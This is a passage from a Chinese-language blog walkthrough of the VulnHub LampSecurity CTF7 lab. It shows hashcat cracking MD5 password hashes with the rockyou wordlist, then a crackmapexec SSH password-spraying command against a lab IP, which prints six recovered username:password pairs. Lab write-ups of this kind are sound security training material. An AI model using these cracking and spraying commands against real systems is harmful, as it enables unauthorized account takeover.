  https://hashcat.net/faq/wrongdriver

* Create <span class="token function">more</span> work items to <span class="token function">make</span> use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

                                                          
Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Exhausted
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: 0 <span class="token punctuation">(</span>MD5<span class="token punctuation">)</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: passhash
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Wed May  3 14:34:10 2023 <span class="token punctuation">(</span>6 secs<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Wed May  3 14:34:16 2023 <span class="token punctuation">(</span>0 secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: 1/1 <span class="token punctuation">(</span>100.00%<span class="token punctuation">)</span>
Speed.<span class="token comment" spellcheck="true">#1.........:  2728.7 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: 8/12 <span class="token punctuation">(</span>66.67%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, 8/12 <span class="token punctuation">(</span>66.67%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: 14344385/14344385 <span class="token punctuation">(</span>100.00%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: 0/14344385 <span class="token punctuation">(</span>0.00%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: 14344385/14344385 <span class="token punctuation">(</span>100.00%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment" spellcheck="true">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment" spellcheck="true">#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]</span>
Hardware.Mon.<span class="token comment" spellcheck="true">#1..: Util: 28%</span>

Started: Wed May  3 14:33:41 2023
Stopped: Wed May  3 14:34:17 2023
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们用这些凭证进行密码喷洒攻击。</p>
<pre><code>┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]
└─$ sudo crackmapexec ssh 192.168.56.141 -u username -p pass --continue-on-success | grep +
SSH         192.168.56.141  22     192.168.56.141   [+] brian:my2cents 
SSH         192.168.56.141  22     192.168.56.141   [+] alice:turtles77 
SSH         192.168.56.141  22     192.168.56.141   [+] leon:qwer1234 
SSH         192.168.56.141  22     192.168.56.141   [+] julia:madrid 
SSH         192.168.56.141  22     192.168.56.141   [+] michael:somepassword 
SSH         192.168.56.141  22     192.168.56.141   [+] charles:chuck33
</code></pre>
<p>非常OK。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-start"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/jarbas/">← Next [vulnhub]  jarbas</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2"><span class="toc-number">1.</span> <span class="toc-text">靶机部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXPLOIT"><span class="toc-number">3.</span> <span class="toc-text">EXPLOIT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">3.1.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi"><span class="toc-number">3.2.</span> <span class="toc-text">SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.3.</span> <span class="toc-text">文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B"><span class="toc-number">4.1.</span> <span class="toc-text">配置文件查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">4.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">密码复用</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>